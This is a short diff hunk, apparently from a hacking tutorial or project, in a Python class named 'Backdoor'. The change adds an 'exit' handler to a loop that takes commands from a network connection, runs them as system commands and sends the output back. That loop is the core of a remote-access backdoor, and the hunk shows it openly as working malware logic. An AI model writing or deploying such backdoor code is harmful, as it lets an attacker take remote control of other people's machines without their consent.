@@ -32,6 +32,9 @@ class Backdoor:
         while True:
             # command = self.connection.recv(2048).decode()
             command = self.receive_json()
+            if(command[0].lower() == "exit"):
+                self.connection.close()
+                exit()
             command_result = self.execute_sys_command(command)
             # self.connection.send(command_result)
             self.send_json(command_result)
